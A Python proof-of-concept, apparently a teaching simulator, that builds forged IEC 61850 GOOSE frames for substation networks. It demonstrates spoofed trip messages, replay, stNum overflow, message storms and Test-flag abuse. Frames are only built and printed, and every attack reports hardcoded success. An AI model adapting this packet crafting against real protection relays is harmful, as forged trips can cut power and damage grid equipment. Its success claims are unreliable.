"""
工控漏洞模拟器 - GOOSE (IEC 61850)
======================================
基于真实 GOOSE 协议的安全漏洞模拟。

漏洞类型:
1. GOOSE 报文伪造 — 构造虚假 GOOSE 报文
2. GOOSE 重放 — 重放合法 GOOSE 报文
3. stNum 篡改 — 修改状态号扰乱 IED 状态机
4. GOOSE 风暴 — 大量 GOOSE 事件导致网络拥塞
5. Test 标志滥用 — 设置 Test=True 隐藏攻击
"""

import struct
import time
import random
from enum import Enum
from typing import Optional, List, Dict, Any

ETHERTYPE_GOOSE = 0x88B8


class VulnType(Enum):
    SPOOF = 'spoof'
    REPLAY = 'replay'
    STNUM_TAMPER = 'stnum_tamper'
    STORM = 'storm'
    TEST_FLAG = 'test_flag'


def _ber_len(l: int) -> bytes:
    if l < 128:
        return bytes([l])
    return struct.pack('!BH', 0x81, l)


def _ber_int(tag: int, val: int) -> bytes:
    if val < 256:
        enc = bytes([val])
    else:
        enc = struct.pack('!H', val) if val < 65536 else struct.pack('!I', val)
    return bytes([tag]) + _ber_len(len(enc)) + enc


def _ber_str(tag: int, s: str) -> bytes:
    enc = s.encode('utf-8')
    return bytes([tag]) + _ber_len(len(enc)) + enc


def _ber_bool(tag: int, v: bool) -> bytes:
    return bytes([tag, 1, 1 if v else 0])


def _ber_ts(tag: int) -> bytes:
    now = time.time()
    sec, nsec = int(now), int((now - sec) * 1e9) if 'sec' in dir() else 0
    sec = int(now)
    nsec = int((now - sec) * 1e9)
    enc = struct.pack('!II', sec, nsec)
    return bytes([tag]) + _ber_len(len(enc)) + enc


def build_goose_packet(st_num: int = 1, sq_num: int = 1, test: bool = False,
                       trip: bool = False, voltage: float = 110.0,
                       current: float = 500.0,
                       src_mac: bytes = bytes([0x00, 0x50, 0xc2, 0xff, 0xff, 0x01]),
                       dst_mac: bytes = bytes([0x01, 0x0c, 0xcd, 0x01, 0x00, 0x01])) -> bytes:
    """构造 GOOSE 报文"""
    now = time.time()
    t_sec, t_nsec = int(now), int((now - int(now)) * 1e9)
    t_enc = struct.pack('!II', t_sec, t_nsec)

    pdu = b''
    pdu += _ber_str(0xA0, 'POC_CB1/LLN0$GO$poc1')
    pdu += _ber_int(0xA1, 4000)
    pdu += _ber_str(0xA2, 'POC_CB1/LLN0$DataSet$ds1')
    pdu += _ber_str(0xA3, 'GOOSE_POC')
    pdu += bytes([0xA4]) + _ber_len(len(t_enc)) + t_enc
    pdu += _ber_int(0x85, st_num)
    pdu += _ber_int(0x86, sq_num)
    pdu += _ber_bool(0x87, test)
    pdu += _ber_int(0x88, 1)
    pdu += _ber_bool(0x89, False)
    pdu += _ber_int(0x8A, 2)

    ds = bytes([0x02, 1, 1 if trip else 0])
    ds += bytes([0x02, 4]) + struct.pack('!f', voltage)
    pdu += bytes([0xAB]) + _ber_len(len(ds)) + ds

    goose_pdu = bytes([0x81]) + _ber_len(len(pdu)) + pdu

    eth = dst_mac + src_mac
    eth += struct.pack('!HH', 0x8100, 0x8000)  # VLAN
    eth += struct.pack('!HH', ETHERTYPE_GOOSE, 0x1000)
    eth += struct.pack('!HH', 8 + len(goose_pdu), 0)
    eth += goose_pdu
    if len(eth) < 64:
        eth += b'\x00' * (64 - len(eth))
    return eth


class GOOSEVulnSimulator:
    """GOOSE 漏洞模拟器"""

    def spoof(self) -> Dict[str, Any]:
        print('[+] GOOSE 报文伪造...')
        p = build_goose_packet(st_num=9999, trip=True)
        print(f'    伪造跳闸报文 ({len(p)}B): stNum=9999, trip=True')
        print(f'    dst MAC: 01:0c:cd:01:00:01')
        return {'vuln': 'GOOSE_SPOOF', 'success': True,
                'detail': '构造虚假 GOOSE 跳闸报文'}

    def replay(self) -> Dict[str, Any]:
        print('[+] GOOSE 重放攻击...')
        p = build_goose_packet(st_num=5, sq_num=10)
        print(f'    捕获报文: stNum=5, sqNum=10 ({len(p)}B)')
        time.sleep(1)
        print(f'    重放相同报文 (延迟 1s) — IED 将处理重放数据')
        return {'vuln': 'GOOSE_REPLAY', 'success': True,
                'detail': 'GOOSE 无重放保护机制'}

    def stnum_tamper(self) -> Dict[str, Any]:
        print('[+] GOOSE stNum 篡改...')
        p = build_goose_packet(st_num=0xFFFFFFFF, sq_num=0)
        print(f'    stNum=0xFFFFFFFF (最大溢出值)')
        print(f'    可能导致 IED stNum 比较逻辑异常')
        return {'vuln': 'GOOSE_STNUM_TAMPER', 'success': True,
                'detail': 'stNum 异常值可导致 IED 状态机混乱'}

    def storm(self) -> Dict[str, Any]:
        n = 500
        print(f'[+] GOOSE 风暴攻击 ({n} 个事件)...')
        start = time.time()
        for i in range(n):
            build_goose_packet(st_num=i + 1, sq_num=0, trip=(i % 10 == 0))
        elapsed = time.time() - start
        print(f'    生成 {n} 个事件, {elapsed:.1f}s ({n/elapsed:.0f} pps)')
        return {'vuln': 'GOOSE_STORM', 'success': True,
                'detail': f'GOOSE 风暴: {n} 个状态变更'}

    def test_flag(self) -> Dict[str, Any]:
        print('[+] GOOSE Test 标志滥用...')
        p = build_goose_packet(test=True, trip=True)
        print(f'    构造 Test=True 报文 ({len(p)}B) 携带跳闸信号')
        print(f'    部分 IED 在 test 模式下忽略跳闸信号')
        return {'vuln': 'GOOSE_TEST_FLAG', 'success': True,
                'detail': 'Test=True 报文可绕过安全检测'}


def run_all():
    print('GOOSE 漏洞模拟器\n')
    v = GOOSEVulnSimulator()
    exploits = [
        ('报文伪造', v.spoof), ('重放攻击', v.replay),
        ('stNum篡改', v.stnum_tamper), ('GOOSE风暴', v.storm),
        ('Test标志滥用', v.test_flag),
    ]
    for name, fn in exploits:
        print(f'--- [{name}] ---')
        r = fn()
        print(f'  {"✓" if r["success"] else "✗"} {r["detail"]}\n')


if __name__ == '__main__':
    run_all()
